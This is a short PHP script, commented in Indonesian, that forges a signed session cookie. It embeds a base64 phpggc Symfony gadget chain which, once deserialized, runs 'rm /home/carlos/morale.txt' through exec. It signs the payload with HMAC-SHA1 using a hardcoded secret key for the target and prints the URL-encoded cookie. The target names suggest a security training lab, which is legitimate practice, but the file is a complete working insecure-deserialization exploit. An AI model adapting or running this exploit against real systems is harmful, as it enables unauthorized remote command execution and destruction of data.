<?php

// Base64 payload dari phpggc (PASTIKAN sudah tanpa newline sejak awal)
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319==";

// 1. Bersihkan whitespace / newline (WAJIB)
$object = trim($object);

// Secret key target
$secretKey = "xzm7ys17yrpoadbaq39aknnbimpuokj9";

// 2. Hitung HMAC dari EXACT string yang sama
$hmac = hash_hmac('sha1', $object, $secretKey);

// 3. Build JSON dengan cara aman (hindari manual concat)
$data = [
    "token" => $object,
    "sig_hmac_sha1" => $hmac
];

$json = json_encode($data);

// 4. URL encode terakhir
$cookie = urlencode($json);

// Output final cookie
echo $cookie . PHP_EOL;

// --- OPTIONAL DEBUG ---
echo "Raw JSON:\n";
echo $json . "\n\n";

echo "Token length: " . strlen($object) . "\n";
echo "HMAC: " . $hmac . "\n";
?>
